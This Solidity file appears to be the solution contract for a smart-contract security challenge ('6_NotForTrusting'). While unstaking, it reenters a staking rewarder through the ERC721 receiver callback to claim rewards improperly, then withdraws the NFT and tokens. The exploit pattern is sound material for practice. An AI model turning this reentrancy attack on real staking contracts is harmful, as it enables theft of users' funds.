// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import "../mocks/NFT.sol";
import "../mocks/marqToken.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import { Staking, Rewarder } from "../src/6_NotForTrusting.sol";


contract Attack6 is IERC721Receiver {

    Staking staking;
    Rewarder rewarder;
    NFT nft;
    MarqToken token;
    bool attackMode;


    constructor(address _staking, address _rewarder, address _nft, address _token) {
        staking = Staking(_staking);
        rewarder = Rewarder(_rewarder);
        nft = NFT(_nft);
        token = MarqToken(_token);
    }

    function stake(uint256 _tokenId) external {
        nft.approve(address(staking), _tokenId);
        staking.stake(_tokenId, 100);
    }

    function unstake(uint256 _tokenId) external {
        staking.unstake(_tokenId, true);
    }

    function setAttackMode(bool _mode) external {
        attackMode = _mode;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if(attackMode) {
            rewarder.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function pullOutWinnings(uint256 _tokenId) external {
        nft.transferFrom(address(this), msg.sender, _tokenId);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

}